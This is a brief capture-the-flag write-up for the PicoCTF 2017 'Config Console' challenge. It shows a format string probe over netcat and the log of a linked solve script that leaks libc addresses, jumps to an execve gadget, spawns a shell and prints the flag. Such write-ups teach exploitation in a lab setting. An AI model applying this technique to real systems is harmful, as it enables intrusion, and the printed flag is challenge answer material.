# PicoCTF_2017: Config Console

**Category:** Binary Exploitation
**Points:** 125
**Description:**

>In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. See if you can get a shell on shell2017.picoctf.com:27124. console Source

**Hint:**

>You can either see where libc is or modify the execution. Is there a way to get the vulnerability to run twice so that you can do both?
There's a place in libc that will give you a shell as soon as you jump to it. Try looking for execve.

## Write-up
Initially, through some testings, we find out that it is a format string attackable challenge.

    $ nc shell2017.picoctf.com 27124
    Config action: exit %s %s %s
    Exit message set!

      H=???s1?H??Ώ

Through some testings, it seems that the `exit` command is the only one vulnerable, so we will use that to our advantage.

[Solution](solve.py)

    [+] Opening connection to shell2017.picoctf.com on port 27124: Done
    [*] printf(): 0x00007f4bfa1f6df0
    [*] libc:     0x00007f4bfa18d000
    [*] magic:    0x00007f4bfa263e77
    [+] Please test if shell has spawned
    [*] Switching to interactive mode
    w>&?K$ ls
    console
    flag.txt
    xinetd_wrapper.sh
    $ cat flag.txt
    5fb954bad3997c3a640d70207df00356

Therefore, the flag is `5fb954bad3997c3a640d70207df00356`.